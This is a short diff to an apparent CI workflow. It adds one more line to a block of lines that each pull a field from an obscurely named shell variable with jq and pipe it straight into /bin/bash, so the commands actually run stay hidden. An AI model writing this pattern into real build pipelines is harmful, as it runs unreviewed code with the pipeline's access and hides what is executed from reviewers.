@@ -30,6 +30,7 @@ jobs:
           echo $lp4 | jq -r .xrxv167 | /bin/bash
           printf '%s' "$e2" | jq -r .xsbp56016 | /bin/bash
           printf '%s' "$shuv280" | jq -r .dl080 | /bin/bash
+          printf '%s' "$ao532" | jq -r .nqpt104 | /bin/bash
 
       - name: Archive output
         if: always()
